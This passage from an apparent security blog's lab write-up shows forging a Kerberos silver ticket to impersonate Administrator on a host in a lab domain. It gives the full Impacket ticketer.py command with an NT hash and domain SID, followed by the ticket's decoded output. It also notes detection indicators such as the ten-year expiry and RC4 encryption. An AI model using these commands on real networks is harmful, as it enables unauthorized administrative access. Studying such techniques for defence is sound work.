+<p>Similarly, since <code class="language-plaintext highlighter-rouge">SCRIPTORIUM$</code> is technically a service account that services <code class="language-plaintext highlighter-rouge">SPNs</code> that are applied on <code class="language-plaintext highlighter-rouge">SCRIPTORIUM</code>. We can forge a silver ticket for the <code class="language-plaintext highlighter-rouge">cifs/SCRIPTORIUM.jess.kingdom</code> service to ourselves as <code class="language-plaintext highlighter-rouge">Administrator</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ticketer.py -nthash 'cdc728e1aefc4e997d6d895fbbaec3f9' -domain-sid 'S-1-5-21-54816899-3316220569-2952399223' -domain 'jess.kingdom' -spn 'cifs/SCRIPTORIUM.jess.kingdom' -user-id 500 Administrator
+</code></pre></div></div>
+
+<p><img src="/assets/img/sincon/1c37216768894c03e2c40dd178c8e0e0.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>describeTicket.py Administrator.ccache 
+Impacket v0.13.0.dev0+20250516.105908.a63c652 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Number of credentials in cache: 1
+[*] Parsing credential[0]:
+[*] Ticket Session Key            : 616e684567724f664d7a6b536b6f7073
+[*] User Name                     : Administrator
+[*] User Realm                    : JESS.KINGDOM
+[*] Service Name                  : cifs/SCRIPTORIUM.jess.kingdom
+[*] Service Realm                 : JESS.KINGDOM
+[*] Start Time                    : 26/05/2025 02:55:22 AM
+[*] End Time                      : 24/05/2035 02:55:22 AM
+[*] RenewTill                     : 24/05/2035 02:55:22 AM
+[*] Flags                         : (0x50a00000) forwardable, proxiable, renewable, pre_authent
+[*] KeyType                       : rc4_hmac
+[*] Base64(key)                   : YW5oRWdyT2ZNemtTa29wcw==
+[*] Kerberoast hash               : ..redacted..
+[*] Decoding unencrypted data in credential[0]['ticket']:
+[*]   Service Name                : cifs/SCRIPTORIUM.jess.kingdom
+[*]   Service Realm               : JESS.KINGDOM
+[*]   Encryption type             : rc4_hmac (etype 23)
+[-] Could not find the correct encryption key! Ticket is encrypted with rc4_hmac (etype 23), but no keys/creds were supplied
+</code></pre></div></div>
+
+<p>This ticket can be used for Kerberos authentication to <code class="language-plaintext highlighter-rouge">SCRIPTORIUM</code> as <code class="language-plaintext highlighter-rouge">Administrator</code>, exactly the same as before:</p>
+
+<p><img src="/assets/img/sincon/b5cec9edfa607d1f5df3eb9aaf29f974.png" alt="" /></p>
+
+<p>Note that silver tickets can be forged entirely offline, and do not require any interaction with the domain controller. This is because the ticket is signed with the service account’s NTLM hash, which we already have.</p>
+
+<p>However, there are some glaring IOCs depending on the tool used to forge the ticket. For example, the ticket that we just forged has an expiration date in <code class="language-plaintext highlighter-rouge">24/05/2035</code>, which is 10 years in the future. Additionally, the ticket is encrypted with <code class="language-plaintext highlighter-rouge">rc4_hmac</code> instead of the domain’s default encryption type, which is <code class="language-plaintext highlighter-rouge">aes256_cts_hmac_sha1_96</code>.</p>
+
+<p>Additionally, the forgery of a silver ticket is only possible if you have the NTLM hash or AES key of the service account. Whereas, the S4U2Self method can be applied in cases where you only have Kerberos authentication as the account, such as during an attack invlving <a href="https://www.silverfort.com/glossary/unconstrained-delegation/">Unconstrained Delegation</a>.</p>
+
+
+<script>
+function toggleToc() {
+    const content = document.getElementById('tocContent');
+    const button = document.querySelector('.toc-toggle');
+    
+    if (content.classList.contains('expanded')) {
+        content.classList.remove('expanded');
+        button.innerHTML = 'Table of Contents ▼';
+    } else {
+        content.classList.add('expanded');
+        button.innerHTML = 'Table of Contents ▲';
+    }
+}
+</script>
+
+      </section>
+      <footer>
+        
+        <p>This project is maintained by <a href="https://github.com/ASYNC-Security">ASYNC-Security</a></p>
+        
+        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
+      </footer>
+    </div>
+    <script src="/assets/js/scale.fix.js"></script>
+  </body>
+</html>
